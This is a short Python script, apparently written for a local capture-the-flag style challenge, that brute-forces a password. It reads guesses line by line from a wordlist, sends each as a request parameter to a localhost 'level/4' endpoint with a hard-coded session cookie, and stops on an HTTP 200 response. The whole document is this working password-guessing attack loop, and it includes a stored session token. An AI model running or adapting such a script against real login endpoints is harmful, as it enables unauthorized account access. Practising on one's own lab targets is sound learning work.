
import requests

session_cookie = ".eJw9yj0KgDAMQOG7ZM7QRlPUq4gUsRGE-tvWQfHu1sX1e--GYZ03L1Gc9XKKD9C0CjUSFh3CnqbL_kdOlDHE5GSJdsoApBUp0gQIKchhg3wfGK64IHZjyWzGuofnBVCoIQE.aiolVQ.KBC_M31vZ3k8yxWLKi6iRLz_1Qk"

cookies = {
	"session": session_cookie
}

with open("months.txt", "r", encoding="utf-8", errors="ignore") as f:
	for line in f:

		password = line.strip()
	
		response = requests.get(
			"http://localhost:8000/level/4",
			params={"password": password},
			cookies=cookies
		)

		print(password, response.status_code)
		if response.status_code == 200:
			print("Password found:", password)
			break